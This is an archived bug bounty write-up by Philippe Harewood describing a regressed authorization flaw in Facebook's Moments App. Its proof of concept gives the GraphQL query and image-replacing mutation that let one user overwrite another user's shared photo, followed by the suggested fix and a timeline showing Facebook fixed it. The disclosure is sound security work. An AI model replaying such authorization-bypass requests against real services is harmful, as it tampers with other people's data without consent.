---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-10-27_rewriting-a-photo-not-owned-by-the-session-user-in-moments-app-revisited.md
original_filename: 2016-10-27_rewriting-a-photo-not-owned-by-the-session-user-in-moments-app-revisited.md
title: Rewriting a photo not owned by the session user in Moments App (Revisited)
category: documents
detected_topics:
- access-control
- command-injection
- otp
- automation-abuse
- graphql
- business-logic
tags:
- imported
- documents
- access-control
- command-injection
- otp
- automation-abuse
- graphql
- business-logic
language: en
raw_sha256: 77dc75c33a914c6ef93da9a5778b9fbd96ea0c3ac4c6816279576e582abc3afe
text_sha256: 360ab45daad4391d8cf011c7a5b5ea1fc60855c4884a235a62d50feb076989fa
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Rewriting a photo not owned by the session user in Moments App (Revisited)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-10-27_rewriting-a-photo-not-owned-by-the-session-user-in-moments-app-revisited.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, automation-abuse, graphql, business-logic
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `77dc75c33a914c6ef93da9a5778b9fbd96ea0c3ac4c6816279576e582abc3afe`
- Text SHA256: `360ab45daad4391d8cf011c7a5b5ea1fc60855c4884a235a62d50feb076989fa`


## Content

---
title: "Rewriting a photo not owned by the session user in Moments App (Revisited)"
page_title: "Rewriting a photo not owned by the session user in Moments App (Revisited) - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/rewriting-a-photo-not-owned-by-the-session-user-in-moments-app-revisited/"
final_url: "https://philippeharewood.com/rewriting-a-photo-not-owned-by-the-session-user-in-moments-app-revisited/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Logic flaw", "Broken authorization"]
publication_date: "2016-10-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6246
---

Posted on [October 27, 2016](https://philippeharewood.com/rewriting-a-photo-not-owned-by-the-session-user-in-moments-app-revisited/)

# Rewriting a photo not owned by the session user in Moments App (Revisited)

This was a regression of [Rewriting a photo not owned by the session user in Moments App](http://philippeharewood.com/rewriting-a-photo-not-owned-by-the-session-user-in-moments-app/).  
**Proof of Concept**  
User A Victim  
User B Malicious User  
1\. First we need a way to find the image in Moments App, as long as the two users are connected in a folder (that is, they are able to see the same photo) this can work.  
The Moments folder used here is called “Kraken Only”, so one inspects the result of this call to find it  
`graphql?q=viewer(){updated_sync_objects.sync_sandbox(moments_prod).after(M){edges{cursor},nodes{__type__,id,uuid,image{uri},payload_json}}}&access_token=ACCESS_TOKEN`  
This is done via user B since he/she should be able to see the photo as well.  
Response  
`{  
"viewer": {  
"updated_sync_objects": {  
"edges": [  
{  
"cursor": "MTQ"  
},  
{  
"cursor": "MTQ"  
},  
{  
"cursor": "MTQ"  
},  
{  
"cursor": "MTQ"  
},  
{  
"cursor": "MTQ"  
}  
],  
"nodes": [  
{  
"__type__": {  
"name": "MomentsAppFolder"  
},  
"id": "555555555555",  
"uuid": "1-2-3-4",  
"image": null,  
"payload_json": "{\"title\":\"Kraken Only\"}"  
},  
{  
"__type__": {  
"name": "MomentsAppFolderMembership",  
},  
"id": "33333333333333333",  
"uuid": "2-4-6-8",  
"image": null,  
"payload_json": "{\"folderUUID\":\"1-2-3-4-\",\"initiatorUUID\":\"fb:A\",\"participantUUID\":\"fb:B\"}"  
},  
{  
"__type__": {  
"name": "MomentsAppFolderMembership"  
},  
"id": "44444444444444444",  
"uuid": "3-4-5-6",  
"image": null,  
"payload_json": "{\"confirmedDate\":1477576449,\"confirmerUUID\":\"fb:A\",\"folderUUID\":\"1-2-3-4-\",\"initiatorUUID\":\"fb:A\",\"participantUUID\":\"fb:A\"}"  
},  
{  
"__type__": {  
"name": "MomentsAppNotification"  
},  
"id": "777777777777777777",  
"uuid": "6-7-8-9",  
"image": null,  
"payload_json": "{\"date\":1477576449,\"folderUUID\":\"1-2-3-4-\",\"photoUUIDs\":\"[\\"P-H-W-D\\"]\n\",\"recipientUUID\":\"fb:B\",\"senderUUID\":\"fb:A\",\"type\":\"photo_added\"}"  
},  
{  
"__type__": {  
"name": "MomentsAppPhoto"  
},  
"id": "11111111111111111",  
"uuid": "P-H-W-D",  
"image": {  
"uri": "https://scontent.xx.fbcdn.net/t39.5527-9/p720x720/14858515_1175451649207387_380449354130915328_n.jpg?_nc_ad=z-m"  
},  
"payload_json": "{\"assetIdentifier\":\"1-7-3-8\",\"date\":1470288138,\"duration\":0,\"editHash\":0,\"folderUUID\":\"1-2-3-4-\",\"hasLocation\":1,\"height\":3264,\"latitude\":36.11385,\"longitude\":-115.16089716667,\"mediaType\":\"photo\",\"originalOwnerUUID\":\"fb:A\",\"ownerUUID\":\"fb:A\",\"width\":2448,\"hiResFileSize\":85121,\"originalResStatus\":\"available\",\"origResFileSize\":1108280}"  
}  
]  
}  
}  
}`  
The photo to be changed is 11111111111111111 with the image uri at https://scontent.xx.fbcdn.net/t39.5527-9/p720x720/14858515_1175451649207387_380449354130915328_n.jpg?_nc_ad=z-m  
A bottle of Kraken Rum.  
2\. Given that 11111111111111111 gives us the UUID: P-H-W-D, I can now use this to create a mutation.  
`POST /graphql  
query_params = {"input":"{\"actor_id\":\"B\",\"client_mutation_id\":\"1\",\"object_uuid\":\"P-H-W-D\"}"}  
q = Mutation SyncAddMutations : SyncAddMutationsResponse {sync_set_image(input){sync_object { id, uuid },client_mutation_id}}`  
file = Image Data here  
Response  
`{  
"sync_set_image": {  
"sync_object": {  
"id": "11111111111111111",  
"uuid": "P-H-W-D"  
},  
"client_mutation_id": "1"  
}  
}`  
The photo is now a pumpkin filled with Captain Morgan.  
https://scontent.xx.fbcdn.net/t39.5527-9/14849280_1175472935871925_597023552478117888_n.jpg?_nc_ad=z-m  
(The previous photo https://scontent.xx.fbcdn.net/t39.5527-9/p720x720/14858515_1175451649207387_380449354130915328_n.jpg?_nc_ad=z-m should now be removed)  
3\. One can verify this by checking the ID  
`graphql?q=node(11111111111111111){image{uri}}`  
Response  
`{  
"11111111111111111": {  
"image": {  
"uri": "https://scontent.xx.fbcdn.net/t39.5527-9/14849280_1175472935871925_597023552478117888_n.jpg?_nc_ad=z-m"  
}  
}  
}`  
4\. These changes are also reflected in Moments App in iPhone and mobile web  
https://m.facebook.com/moments_app/987654321/  
Suggested change would be the same as the [previous bug](http://philippeharewood.com/rewriting-a-photo-not-owned-by-the-session-user-in-moments-app/) to ensure only the owner can change the photo.  
**Impact**  
The impact here is limited to only users who can see the same Moments photo.  
**Timeline**

  * Oct 27, 2016 – Report Sent
  * Nov 9, 2016 – Escalation by Facebook
  * Nov 11, 2016 – Fixed by Facebook
  * Nov 16, 2016 – Bounty Awarded by Facebook
